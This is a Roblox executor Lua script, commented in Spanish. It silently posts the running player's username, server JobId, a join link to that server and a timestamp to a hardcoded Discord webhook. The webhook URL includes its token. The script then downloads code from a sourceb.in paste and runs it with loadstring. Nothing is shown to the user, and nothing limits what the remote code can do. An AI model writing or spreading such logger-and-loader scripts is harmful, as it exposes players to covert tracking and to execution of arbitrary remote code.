getgenv().EjecutarsePrimero = true

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Webhook de Discord
local WebhookURL = "https://discord.com/api/webhooks/1384927333562978385/psrT9pR05kv9vw4rwr4oyiDcb07S3ZqAlV_2k_BsbI2neqrmEHOCE_QuFvVvRwd7lNuY"

-- Datos seguros
local placeId = tostring(game.PlaceId)
local jobId = tostring(game.JobId)
local nick = LocalPlayer.Name
local joinLink = "https://www.roblox.com/games/"..placeId.."?gameId="..jobId
local timestamp = os.date("!%Y-%m-%d %H:%M:%S UTC")

-- Info para enviar
local info = {
    ["content"] = "**Nuevo Ejecutor Detectado!**",
    ["embeds"] = {{
        ["title"] = "Datos para unirse",
        ["description"] = "Información Delta-safe:",
        ["color"] = 5814783,
        ["fields"] = {
            {["name"] = "Usuario", ["value"] = nick, ["inline"] = true},
            {["name"] = "PlaceId", ["value"] = placeId, ["inline"] = true},
            {["name"] = "JobId", ["value"] = jobId, ["inline"] = true},
            {["name"] = "Link de unión", ["value"] = joinLink, ["inline"] = false},
            {["name"] = "Hora (UTC)", ["value"] = timestamp, ["inline"] = false}
        }
    }}
}

local jsonData = HttpService:JSONEncode(info)

-- Enviar webhook Delta-safe
pcall(function()
    request({
        Url = WebhookURL,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = jsonData
    })
end)
loadstring(game:HttpGet("https://cdn.sourceb.in/bins/d7tPQFbVBD/0", true))()
